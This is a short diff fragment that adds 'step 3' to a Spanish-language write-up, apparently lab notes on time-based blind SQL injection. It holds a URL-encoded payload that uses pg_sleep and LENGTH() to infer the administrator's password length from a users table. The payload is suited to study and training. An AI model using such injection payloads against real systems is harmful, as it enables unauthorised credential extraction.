@@ -63,3 +63,10 @@ Por el Orden de ejecucion
 
 ```
 
+# Extraer los datos Paso 3
+
+Sabiendo que tienemos un password utilizamos el LENGTH()
+
+```
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
